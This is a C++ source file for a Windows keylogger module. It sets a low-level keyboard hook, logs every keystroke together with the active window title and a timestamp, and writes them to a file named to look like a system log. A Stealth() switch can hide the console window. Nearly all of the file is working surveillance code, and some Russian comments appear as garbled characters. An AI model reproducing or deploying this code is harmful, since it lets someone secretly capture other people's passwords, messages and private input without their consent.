#pragma once

#pragma comment(lib,"user32.lib")

#include "KeyLoggerModule.h"

#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>

#pragma warning(disable:4996)
#pragma warning(disable:4703)

// �������, ������ ���� �� �
// �� ���� ������� �� ��������� makefile, � �� � ����� ����
#define visible // (visible / invisible)

// ����� ��� ��������� HANDLE ����
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.

// �� ��������� ������ ���, ������� ��������� �������� ����. �� �� ������ � ������� ���������� �������
// ������ ��, �� ��� �����������: vkCode = ��� ����������� �����.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream OUTPUT_FILE("Logs/System32Log.txt", std::ios_base::app);

extern char lastwindow[256];

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// save to file
			Save(kbdStruct.vkCode);
		}
	}
	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.

	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
	char lastwindow[256];

	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ���������� �������� ������

	HWND foreground = GetForegroundWindow();
	//DWORD threadID;
	//HKL layout = GetKeyboardLayout(0);
	//
	//if (foreground) {
	//	//get keyboard layout of the thread
	//	threadID = GetWindowThreadProcessId(foreground, NULL);
	//	//layout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
	//	layout = GetKeyboardLayout(threadID);
	//	std::cout << std::endl << layout << std::endl;
	//}

	//HKL layout{};
	//GUITHREADINFO gti{ sizeof(GUITHREADINFO) };
	//if (GetGUIThreadInfo(NULL, &gti)) //Get keyboard layout of the foreground thread
	//	layout = GetKeyboardLayout(GetWindowThreadProcessId(gti.hwndFocus, NULL));
	//else
	//	layout = GetKeyboardLayout(NULL); //Get keyboard layout of this thread (always const)





	HKL layout{};
	GUITHREADINFO gti{ sizeof(GUITHREADINFO) };
	if (GetGUIThreadInfo(NULL, &gti)) // �������� ��������� ��������� ������ ���������� �����
		layout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
	else
		layout = GetKeyboardLayout(NULL); // �������� ��������� ��������� ����� ������ (������ � const)
	std::cout << std::endl << layout << std::endl;



	if (foreground)
	{
		char window_title[256];
		GetWindowText(foreground, window_title, 256);

		if (strcmp(window_title, lastwindow) != 0) {
			strcpy_s(lastwindow, window_title);

			// �������� ���
			time_t t = time(NULL);
			struct tm* tm = localtime(&t);
			char s[64];
			strftime(s, sizeof(s), "%c", tm);

			OUTPUT_FILE << "\n\n[Window: " << window_title << " - at " << s << "] ";
		}
	}


	std::cout << key_stroke << '\n';

	if (key_stroke == VK_BACK)
		OUTPUT_FILE << "[BACKSPACE]";
	else if (key_stroke == VK_RETURN)
		OUTPUT_FILE << "\n";
	else if (key_stroke == VK_SPACE)
		OUTPUT_FILE << " ";
	else if (key_stroke == VK_TAB)
		OUTPUT_FILE << "[TAB]";
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		OUTPUT_FILE << "[SHIFT]";
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		OUTPUT_FILE << "[CONTROL]";
	else if (key_stroke == VK_ESCAPE)
		OUTPUT_FILE << "[ESCAPE]";
	else if (key_stroke == VK_END)
		OUTPUT_FILE << "[END]";
	else if (key_stroke == VK_HOME)
		OUTPUT_FILE << "[HOME]";
	else if (key_stroke == VK_LEFT)
		OUTPUT_FILE << "[LEFT]";
	else if (key_stroke == VK_UP)
		OUTPUT_FILE << "[UP]";
	else if (key_stroke == VK_RIGHT)
		OUTPUT_FILE << "[RIGHT]";
	else if (key_stroke == VK_DOWN)
		OUTPUT_FILE << "[DOWN]";
	else if (key_stroke == 190 || key_stroke == 110)
		OUTPUT_FILE << ".";
	else if (key_stroke == 189 || key_stroke == 109)
		OUTPUT_FILE << "-";
	else if (key_stroke == 20)
		OUTPUT_FILE << "[CAPSLOCK]";
	else {
		char key;
		// �������� Caps Lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// �������� ������ shift
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
			lowercase = !lowercase;
		}

		// ���������� ��������� ������ �������� �� ��������� ���������
		//key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
		key = MapVirtualKeyExW(key_stroke, MAPVK_VK_TO_CHAR, layout);


		//tolower converts it to lowercase properly
		// tolower ��������� ���������� ���� �� lowercase
		if (!lowercase) key = tolower(key);
		OUTPUT_FILE << char(key);
	}
	// ������ ����, ��� ������ ��������� �� ��������� ��������� �����, ������� ���� �������� � ������.
	OUTPUT_FILE.flush();
	return 0;
}

void Stealth()
{
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif // visible

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif // invisible
}

//int APIENTRY wWinMain(HINSTANCE hInstance,
//	HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
//	//open output file in append mode
//	OUTPUT_FILE.open("System32Log.txt", std::ios_base::app);
//
//	// visibility of window
//	Stealth();
//
//	// Set the hook
//	SetHook();
//
//	// loop to keep the console application running.
//	MSG msg;
//	while (GetMessage(&msg, NULL, 0, 0))
//	{
//	}
//
//	OUTPUT_FILE.close();
//}


//int main()
//{
//	//������� �������� ���� � ����� ���������
//	OUTPUT_FILE.open("System32Log.txt", std::ios_base::app);
//
//	// �������� ������
//	//Stealth();
//
//	// ���������� hook
//	SetHook();
//
//	// ���� ��� �������� ������ ��������� ��������
//	MSG msg;
//	while (GetMessage(&msg, NULL, 0, 0))
//	{
//	}
//
//	OUTPUT_FILE.close();
//}


